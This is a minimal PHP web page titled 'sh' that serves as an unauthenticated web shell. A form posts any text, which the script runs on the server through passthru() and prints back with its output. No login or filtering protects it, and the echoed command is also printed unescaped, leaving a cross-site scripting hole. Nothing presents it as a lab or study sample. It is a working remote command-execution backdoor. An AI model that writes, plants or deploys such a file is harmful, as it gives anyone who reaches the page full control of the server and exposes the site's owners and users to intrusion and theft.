<!doctype html>
<html lang="en">
<head>
	<meta charset="UTF-8">
	<title>sh</title>
	<style>
	.cmd-inp{
		border: solid 1px #DDD;
		padding: 5px 10px;
		font-family: monospace;
		font-size: 14px;
		width: 500px;
	}
	</style>
</head>
<body>
<?php
$command = !empty($_POST['command']) ? $_POST['command'] : '';
$stderr = !empty($_POST['stderr']);

if ($command) {
	$cmd = $command;
	if ($stderr)
		$cmd .= ' 2>&1';

	echo "<pre>> $cmd:\n\n";
	passthru($cmd);
	echo "\n\n</pre><hr><br><br>";
}

?>

<form action="" method="post">
	<input class="cmd-inp" type="text" name="command" value="<?= htmlspecialchars($command); ?>">
	<label><input type="checkbox" name="stderr" value="1" checked>2>&1</label>
	<input type="submit" value="Run">
</form>

</body>
</html>